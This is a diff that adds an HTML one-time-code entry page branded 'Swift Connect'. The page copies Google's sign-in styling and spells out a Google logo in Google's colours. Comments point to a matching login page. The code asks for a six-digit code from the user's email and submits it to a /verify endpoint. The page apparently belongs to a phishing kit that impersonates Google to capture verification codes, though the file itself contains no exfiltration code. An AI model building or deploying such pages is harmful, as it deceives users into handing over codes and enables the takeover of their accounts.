@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verify - Swift Connect</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
+
+<style>
+
+/* SAME BASE AS LOGIN */
+body {
+    margin: 0;
+    background: #f8f9fa;
+    font-family: 'Roboto', sans-serif;
+
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+}
+
+/* CARD */
+.login-card {
+    width: 360px;
+    background: #ffffff;
+    border: 1px solid #dadce0;
+    border-radius: 8px;
+    padding: 40px 30px;
+    box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+}
+
+/* BRAND */
+.brand {
+    text-align: center;
+    font-weight: 500;
+    font-size: 18px;
+    margin-bottom: 10px;
+}
+
+/* GOOGLE LOGO */
+.logo {
+    text-align: center;
+    font-size: 20px;
+    font-weight: bold;
+    margin-bottom: 20px;
+}
+
+/* TITLE */
+.title {
+    font-size: 22px;
+    font-weight: 500;
+    color: #202124;
+    text-align: center;
+    margin-bottom: 6px;
+}
+
+/* SUBTEXT */
+.subtitle {
+    font-size: 14px;
+    color: #5f6368;
+    text-align: center;
+    margin-bottom: 25px;
+}
+
+/* OTP BOXES */
+.otp-container {
+    display: flex;
+    justify-content: space-between;
+    margin-bottom: 20px;
+}
+
+.otp-container input {
+    width: 45px;
+    height: 50px;
+    text-align: center;
+    font-size: 18px;
+    border: 1px solid #dadce0;
+    border-radius: 6px;
+}
+
+.otp-container input:focus {
+    border: 2px solid #1a73e8;
+    outline: none;
+}
+
+/* ACTIONS */
+.actions {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+}
+
+/* LINKS */
+.link {
+    color: #1a73e8;
+    font-size: 14px;
+    cursor: pointer;
+}
+
+/* BUTTON */
+button {
+    background: #1a73e8;
+    color: white;
+    border: none;
+    border-radius: 4px;
+    padding: 10px 24px;
+    font-weight: 500;
+    cursor: pointer;
+}
+
+button:hover {
+    background: #1765cc;
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="login-card">
+
+    <!-- BRAND -->
+    <div class="brand">SWIFT CONNECT</div>
+
+    <!-- GOOGLE -->
+    <div class="logo">
+        <span style="color:#4285F4">G</span>
+        <span style="color:#DB4437">o</span>
+        <span style="color:#F4B400">o</span>
+        <span style="color:#4285F4">g</span>
+        <span style="color:#0F9D58">l</span>
+        <span style="color:#DB4437">e</span>
+    </div>
+
+    <!-- TEXT -->
+    <div class="title">Enter OTP</div>
+    <div class="subtitle">Check your email for OTP</div>
+
+    <!-- FORM -->
+    <form method="POST" action="/verify">
+
+        <!-- OTP INPUTS -->
+        <div class="otp-container">
+            <input type="text" maxlength="1">
+            <input type="text" maxlength="1">
+            <input type="text" maxlength="1">
+            <input type="text" maxlength="1">
+            <input type="text" maxlength="1">
+            <input type="text" maxlength="1">
+        </div>
+
+        <!-- HIDDEN FULL OTP -->
+        <input type="hidden" name="otp" id="otp">
+
+        <!-- ACTIONS -->
+        <div class="actions">
+            <span class="link">Resend</span>
+            <button type="submit">Verify</button>
+        </div>
+
+    </form>
+
+</div>
+
+<script>
+// combine OTP boxes into one value
+const inputs = document.querySelectorAll(".otp-container input");
+const hiddenInput = document.getElementById("otp");
+
+inputs.forEach((input, index) => {
+    input.addEventListener("input", () => {
+        if (input.value.length === 1 && index < inputs.length - 1) {
+            inputs[index + 1].focus();
+        }
+
+        let otp = "";
+        inputs.forEach(i => otp += i.value);
+        hiddenInput.value = otp;
+    });
+});
+</script>
+
+</body>
+</html>
